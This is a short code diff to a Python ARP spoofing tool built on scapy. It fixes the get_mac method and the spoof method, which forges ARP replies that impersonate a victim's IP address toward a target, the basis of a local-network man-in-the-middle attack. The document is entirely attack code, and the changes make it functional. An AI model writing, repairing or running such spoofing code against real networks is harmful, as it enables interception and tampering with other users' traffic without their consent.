@@ -4,6 +4,7 @@ from threading import Thread, Event
 from libs import logger as _
 
 log = _.log
+ip  = ""
 
 # execute arp spoofing (is Multi-threaded)
 class spoofer(Thread):
@@ -17,7 +18,7 @@ class spoofer(Thread):
         # delete the value from the instance
 
     # get the mac from the network
-    def get_mac(ip):
+    def get_mac(self, ip):
         # ARP request
         req = scapy.ARP(pdst=ip)
         # Broadcast Ethernet layer
@@ -31,7 +32,7 @@ class spoofer(Thread):
 
     # We'll send the packet to the target by pretending being the victim
     def spoof(self, victim, target):
-        target_mac = self.get_mac()
+        target_mac = self.get_mac(victim)
         self.targets[target] = target_mac
         self.pkts.append(scapy.ARP(op=2, hwdst=target_mac, pdst=target, psrc=victim))
 
